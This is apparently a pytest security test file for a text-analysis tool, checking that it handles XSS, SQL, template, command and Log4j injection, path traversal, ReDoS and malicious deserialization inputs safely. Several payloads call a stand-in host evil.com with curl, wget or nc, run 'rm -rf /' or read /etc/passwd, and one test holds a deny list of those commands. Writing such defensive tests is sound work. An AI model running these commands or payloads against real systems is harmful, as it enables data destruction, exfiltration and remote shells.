"""
Security Tests for Input Validation and Sanitization

Tests security measures including:
- Input validation and sanitization
- ReDoS attack prevention
- URL sanitization
- Malicious input handling
- XSS prevention
- Injection attack prevention
"""

import pytest
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add src to path for testing
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation and sanitization security measures"""

    def test_redos_prevention_input_validation(self):
        """Test ReDoS (Regular expression Denial of Service) prevention"""
        # Test ReDoS prevention using the main analyze_text_demo function
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        # Create ReDoS attack patterns
        redos_patterns = [
            "a" * 5000 + "!",  # Long repeated characters (reduced size)
            "(" * 1000,        # Excessive nested groups  
            "a" * 500 + "b" * 500 + "c" * 500,  # Complex pattern
            "Custom implementation " + "a" * 1000,  # Realistic with repetition
        ]
        
        for malicious_input in redos_patterns:
            try:
                # Should complete in reasonable time without hanging
                import time
                start_time = time.time()
                
                result = analyze_text_demo(malicious_input[:2000])  # Limit length
                
                end_time = time.time()
                duration = end_time - start_time
                
                # Should complete quickly even for malicious patterns
                assert duration < 10.0, f"Input validation took too long: {duration}s"
                assert isinstance(result, dict)
                
            except Exception as e:
                # Should handle malicious input gracefully
                assert "timeout" in str(e).lower() or "invalid" in str(e).lower() or "memory" in str(e).lower()

    def test_input_sanitization_xss_prevention(self):
        """Test XSS prevention in input sanitization"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('xss')}",
            "<iframe src=javascript:alert('xss')></iframe>",
        ]
        
        for payload in xss_payloads:
            result = analyze_text_demo(payload)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Response should not contain executable script content
            response_str = str(result)
            assert "<script>" not in response_str
            assert "javascript:" not in response_str
            assert "onerror=" not in response_str

    def test_injection_attack_prevention(self):
        """Test prevention of various injection attacks"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        injection_payloads = [
            "'; DROP TABLE users; --",  # SQL injection
            "{{ system('rm -rf /') }}",  # Template injection
            "../../../etc/passwd",       # Path traversal
            "${jndi:ldap://evil.com/a}", # Log4j injection
            "$(curl evil.com)",          # Command injection
            "`rm -rf /`",               # Command injection
            "||rm -rf /||",             # Command injection
        ]
        
        for payload in injection_payloads:
            result = analyze_text_demo(payload)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Should not execute system commands or access file system
            response_str = str(result)
            # Response shouldn't contain dangerous patterns
            dangerous_patterns = ["DROP TABLE", "rm -rf", "system(", "exec("]
            for pattern in dangerous_patterns:
                assert pattern not in response_str

    def test_url_sanitization_security(self):
        """Test URL sanitization security measures"""
        from vibe_check.tools.shared.github_helpers import sanitize_github_urls_in_response
        
        malicious_urls = {
            "html_url": "javascript:alert('xss')",
            "api_url": "data:text/html,<script>alert('xss')</script>",
            "nested": {
                "url": "vbscript:msgbox('xss')",
                "link": "file:///etc/passwd"
            },
            "urls": [
                "http://evil.com/malware",
                "ftp://malicious-server.com/backdoor"
            ]
        }
        
        sanitized = sanitize_github_urls_in_response(malicious_urls)
        
        assert isinstance(sanitized, dict)
        sanitized_str = str(sanitized)
        
        # Should remove or sanitize dangerous URL schemes
        dangerous_schemes = ["javascript:", "data:", "vbscript:", "file://"]
        for scheme in dangerous_schemes:
            assert scheme not in sanitized_str

    def test_large_input_dos_prevention(self):
        """Test prevention of DoS attacks via large inputs"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        # Test various large input sizes
        large_inputs = [
            "A" * 100000,   # 100KB
            "B" * 1000000,  # 1MB  
            "🚀" * 50000,   # Large Unicode
        ]
        
        for large_input in large_inputs:
            try:
                import time
                start_time = time.time()
                
                result = analyze_text_demo(large_input)
                
                end_time = time.time()
                duration = end_time - start_time
                
                assert isinstance(result, dict)
                assert 'status' in result
                
                # Should complete in reasonable time
                assert duration < 30.0, f"Large input processing took too long: {duration}s"
                
            except Exception as e:
                # May reject extremely large inputs, which is acceptable
                error_msg = str(e).lower()
                acceptable_errors = ["too large", "size limit", "timeout", "memory"]
                assert any(err in error_msg for err in acceptable_errors)

    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection attacks"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        null_byte_payloads = [
            "normal_text\x00malicious_content",
            "\x00\x01\x02\x03test",
            "path/to/file\x00.txt",
            "test\x00<script>alert('xss')</script>",
        ]
        
        for payload in null_byte_payloads:
            result = analyze_text_demo(payload)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Response should handle null bytes safely
            response_str = str(result)
            assert "\x00" not in response_str  # Null bytes should be filtered

    def test_unicode_normalization_attacks(self):
        """Test prevention of Unicode normalization attacks"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        # Unicode normalization attack vectors
        unicode_attacks = [
            "café",  # Normal
            "cafe\u0301",  # Same visually but different bytes
            "ℌ℩⁅⁆⁇⁈⁉⁊⁋⁌⁍⁎⁏⁐⁑",  # Mathematical symbols
            "\u200B\u200C\u200D",  # Zero-width characters
            "\uFEFF",  # Byte order mark
        ]
        
        for attack in unicode_attacks:
            result = analyze_text_demo(attack)
            
            assert isinstance(result, dict)
            assert 'status' in result
            # Should handle various Unicode forms safely

    def test_memory_exhaustion_prevention(self):
        """Test prevention of memory exhaustion attacks"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Test with various memory exhaustion patterns
        memory_attacks = [
            " " * 500000,  # Large whitespace
            "x" * 500000,  # Large repeated character
            ("nested " * 100) * 1000,  # Nested repetition
        ]
        
        for attack in memory_attacks[:1]:  # Test one to avoid actual exhaustion
            try:
                result = analyze_text_demo(attack)
                
                assert isinstance(result, dict)
                assert 'status' in result
                
                # Check memory usage didn't explode
                current_memory = process.memory_info().rss
                memory_increase = current_memory - initial_memory
                
                # Should not use excessive memory (allow reasonable increase)
                assert memory_increase < 200 * 1024 * 1024, f"Excessive memory usage: {memory_increase} bytes"
                
            except Exception as e:
                # May reject memory-intensive inputs, which is acceptable
                error_msg = str(e).lower()
                acceptable_errors = ["memory", "size", "limit", "resource"]
                assert any(err in error_msg for err in acceptable_errors)

    def test_regex_complexity_limits(self):
        """Test limits on regex complexity to prevent ReDoS"""
        from vibe_check.tools.vibe_mentor_enhanced import ContextExtractor
        
        # Complex regex patterns that could cause ReDoS
        complex_patterns = [
            "(a+)+b",
            "(a|a)*b", 
            "([a-zA-Z]+)*$",
            "^(([a-z])+.)+[A-Z]([a-z])+$",
        ]
        
        for pattern in complex_patterns:
            test_input = pattern + "a" * 1000  # Add content that might trigger backtracking
            
            import time
            start_time = time.time()
            
            try:
                result = ContextExtractor._validate_input(test_input[:500])  # Limit length
                
                end_time = time.time()
                duration = end_time - start_time
                
                # Should complete quickly
                assert duration < 3.0, f"Regex processing took too long: {duration}s"
                assert isinstance(result, str)
                
            except Exception as e:
                # May timeout or reject complex patterns
                assert "timeout" in str(e).lower() or "complex" in str(e).lower()

    def test_prototype_pollution_prevention(self):
        """Test prevention of prototype pollution attacks (JavaScript-style)"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        pollution_payloads = [
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            "__proto__.polluted = true",
            "Object.prototype.polluted = true",
        ]
        
        for payload in pollution_payloads:
            result = analyze_text_demo(payload)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Should not execute JavaScript-like code
            response_str = str(result)
            assert "__proto__" not in response_str
            assert "prototype" not in response_str or "pattern" in response_str  # Allow "pattern" word

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fets/passwd",  # URL encoded
            "....//....//....//etc/passwd",  # Double encoding
            "/var/log/../../../../etc/passwd",
        ]
        
        for payload in path_traversal_payloads:
            result = analyze_text_demo(payload)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Should not attempt to access file system paths
            response_str = str(result)
            sensitive_paths = ["/etc/passwd", "system32", "config/sam"]
            for path in sensitive_paths:
                assert path not in response_str.lower()

    @patch('subprocess.run')
    def test_command_injection_prevention(self, mock_subprocess):
        """Test prevention of command injection in subprocess calls"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        # Configure mock to simulate command injection attempt
        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = "Mocked output"
        
        command_injections = [
            "test; rm -rf /",
            "test && curl evil.com",  
            "test | nc evil.com 4444",
            "test `curl evil.com`",
            "test $(wget evil.com)",
        ]
        
        for injection in command_injections:
            result = analyze_text_demo(injection)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Should not execute system commands
            # Check that subprocess wasn't called with dangerous commands
            if mock_subprocess.called:
                for call in mock_subprocess.call_args_list:
                    command_str = str(call)
                    dangerous_cmds = ["rm -rf", "curl", "wget", "nc"]
                    for cmd in dangerous_cmds:
                        assert cmd not in command_str

    def test_deserialization_safety(self):
        """Test safety of data deserialization"""
        from vibe_check.tools.analyze_text_nollm import analyze_text_demo
        
        # Malicious serialized data patterns
        malicious_data = [
            "!!python/object/apply:os.system ['rm -rf /']",  # YAML
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0",  # Java serialized
            "\x80\x03cos\nsystem\nq\x00X\x07\x00\x00\x00rm -rf /q\x01\x85q\x02Rq\x03.",  # Python pickle
        ]
        
        for data in malicious_data:
            result = analyze_text_demo(data)
            
            assert isinstance(result, dict)
            assert 'status' in result
            
            # Should not execute deserialized commands
            response_str = str(result)
            assert "rm -rf" not in response_str
            assert "system" not in response_str or "system" in response_str.lower()  # Allow word "system"